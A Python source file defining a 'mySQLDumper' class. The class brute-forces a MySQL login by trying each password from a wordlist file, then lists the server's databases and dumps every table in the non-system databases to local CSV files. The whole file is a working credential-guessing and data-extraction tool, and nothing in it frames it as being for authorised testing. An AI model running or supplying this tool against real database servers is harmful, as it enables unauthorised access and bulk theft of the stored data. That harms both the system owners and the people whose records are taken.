import os
import shutil
import csv
import mysql.connector

class mySQLDumper:
    def __init__(self, **kwargs):
        self.hostname = kwargs.get('hostname')
        self.port = kwargs.get('port')
        self.username = kwargs.get('username')
        self.password = kwargs.get('password')
        self.currentDatabase = kwargs.get('database')
        self.databases = []
        self.wordlist = kwargs.get('wordlist')
        self.avoidSysDBs = kwargs.get('avoidSysDBs')
        self.ssl_disabled = kwargs.get('ssl_disabled')
        self.verbose = kwargs.get('verbose')

    def validCredentials(self): 
        validCredentials = False
        try:
            cnx = mysql.connector.connect(user=self.username,password=self.password,host=self.hostname,database=self.currentDatabase,ssl_disabled=self.ssl_disabled)
            if cnx.is_connected(): validCredentials = True
            cnx.close()
        except mysql.connector.Error: print(f"Not valid credentials for username: {self.username} and password: {self.password}")
        return validCredentials

    def wordlistAttack(self):
      try:
        with open(self.wordlist,'r',encoding="utf8") as wordlist:
          for line in wordlist:
            password = line.strip()
            try:
              cnx = mysql.connector.connect(user=self.username,password=password,host=self.hostname,database=self.currentDatabase,ssl_disabled=self.ssl_disabled)
              if cnx.is_connected():
                self.password = password
                print(f"Found valid credentials - Username: {self.username} Password: {password}")
                cnx.close()
                return
            except mysql.connector.Error as err: print(f"Connection failed with username: {self.username} and password: {password}") if self.verbose else None
        print(f"No valid credentials found in \"{self.wordlist}\" for username: {self.username}")
      except FileNotFoundError: print(f"Dictionary \"{self.wordlist}\" not found!")
    
    def getDatabases(self):
      if not self.validCredentials(): return
      try:
        cnx = mysql.connector.connect(user=self.username,password=self.password,host=self.hostname,database='',ssl_disabled=self.ssl_disabled)
        cursor = cnx.cursor()
        cursor.execute("SHOW DATABASES")
        self.databases = cursor.fetchall()
        cnx.close()
      except mysql.connector.Error as err: print(f"Error getting databases: {err}")

    def dumpDatabase(self, database):
      if not self.validCredentials(): return
      try:
        print(f"Dumping database: {database}")
        cnx = mysql.connector.connect(user=self.username,password=self.password,host=self.hostname,database=database,ssl_disabled=self.ssl_disabled)
        cursor = cnx.cursor()
        cursor.execute(f"SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE != 'VIEW' AND TABLE_SCHEMA = '{database}';")
        tables = cursor.fetchall()
        if os.path.exists(f"./{database}"): shutil.rmtree(f"./{database}")
        os.mkdir(f"./{database}")
        for table in tables:
            print(f"Dumping table: {table[0]}") if self.verbose else None
            cursor.execute(f"SELECT * FROM {table[0]}")
            rows = cursor.fetchall()
            try: 
              with(open(f"./{database}/{table[0]}.csv","w",encoding="utf-8",newline="")) as f: 
                  csv.writer(f, quoting=csv.QUOTE_ALL).writerows(rows)
            except FileNotFoundError as err: print(f"Error saving table: {err}")
        cnx.close()
      except mysql.connector.Error as err: print(f"Error dumping database: {err}")

    def dumpAllDatabases(self):
      self.getDatabases()
      for database in self.databases:
        if self.avoidSysDBs and database[0] in ["mysql", "information_schema", "performance_schema", "sys"]: continue
        else: self.dumpDatabase(database[0])